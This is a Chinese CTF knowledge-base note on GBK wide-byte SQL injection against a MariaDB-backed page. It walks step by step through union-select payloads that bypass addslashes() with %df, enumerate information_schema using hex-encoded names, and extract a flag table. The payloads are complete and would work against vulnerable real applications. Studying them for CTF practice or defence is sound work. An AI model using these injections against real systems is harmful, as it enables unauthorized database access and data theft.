---
title: 宽字节注入（GBK Wide-Byte Injection）
category: web
tags: [sqli, wide-byte, gbk, union, hex-bypass, mariadb]
triggers: [宽字节注入, %df, GBK, 宽字符, 吃掉反斜杠, addslashes, 单引号转义绕过, MariaDB, Union联合查询, 十六进制绕过, hex绕过单引号, information_schema, 查询闭合方式]
created: 2026-06-07
updated: 2026-06-07
sources: [raw/LitCTF 2026 WEB方向全WP.md]
---

## Summary

GBK 编码下，`%df\'` 被解析为 `運'`（0xdf5c = 宽字符 + 0x27 = 单引号），绕过 `addslashes()` 的 `%df%5c%27` 转义。后续 Union 联合查询爆库，十六进制编码 `0x...` 绕过 MariaDB 的单引号过滤。

## Key Points

- GBK 宽字节注入：`%df'` → MySQL 转义为 `%df\'` → GBK 解码 `%df%5c` = `運` → 剩余 `'` 闭合 SQL 语句
- 无报错回显时优先测宽字节（无 `Unknown column` 异常却正常回显）
- MariaDB 的 `information_schema` 格式与 MySQL 完全相同
- `table_schema=0x...` 十六进制编码绕过单引号过滤

## Step-by-Step

### 1. 确认宽字节注入点

```http
/query?id=1%df'
```
返回 SQL 语法报错（MariaDB），说明闭合成功。

### 2. 判断列数

```http
/query?id=1%df' order by 5%23  → 正常
/query?id=1%df' order by 6%23  → 报错
```
共 5 列。

### 3. 找回显位

```http
/query?id=-1%df' union select 1,2,3,4,5%23
```
每列都是回显位。

### 4. 爆库名

```http
/query?id=-1%df' union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata%23
```

### 5. 爆表名（hex 绕过单引号）

```http
/query?id=-1%df' union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=0x657a73716c%23
```
`0x657a73716c` = `ezsql` 的 hex

### 6. 爆列名

```http
/query?id=-1%df' union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=0x657a73716c and table_name=0x666c61675f73746f7265%23
```
`0x666c61675f73746f7265` = `flag_store` 的 hex

### 7. 爆数据

```http
/query?id=-1%df' union select 1,flag,3,4,5 from ezsql.flag_store%23
```

## Common Hex Table

| 字符串 | Hex |
|--------|-----|
| `ezsql` | `0x657a73716c` |
| `flag_store` | `0x666c61675f73746f7265` |
| `flag` | `0x666c6167` |
| `mysql` | `0x6d7973716c` |

## Connections
- Related: [[sql-direct-postgresql]]
- GHSA: [[web/ghsa-sqli-path-traversal]]
- Source: [[raw/LitCTF 2026 WEB方向全WP]]
